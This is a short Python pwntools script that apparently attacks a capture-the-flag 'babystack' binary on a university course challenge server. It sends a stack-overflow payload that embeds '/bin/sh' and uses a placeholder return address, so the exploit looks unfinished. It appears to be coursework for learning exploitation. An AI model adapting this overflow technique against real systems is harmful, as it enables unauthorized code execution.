from pwn import *
DEBUG = False
LOCAL = False
def binary_connect():
  if LOCAL:
      if DEBUG:
          p = gdb.debug('./babystack.out', '''
              break main
              continue
          ''')
      else:
          p = process('./babystack.out')

  else:
      # Create process from local 
      p = remote('offsec-chalbroker.osiris.cyber.nyu.edu',1346)
  
  return p

def exploit():
  p = binary_connect()
  e = ELF('./babystack.out')
  r = ROP(e)
  rsp_addr = 0x7ffea0727648
  pause()
  # overflow buffer
  input = b'\x00\x00\x00\x00' + b'/' * 0x30 + b'/bin/sh\x00'
  p.send(input + b'A' * (0x48 - len(input)) + b'BBBB')

  p.close()


if __name__ == "__main__":
  context.log_level = 'debug'
  exploit()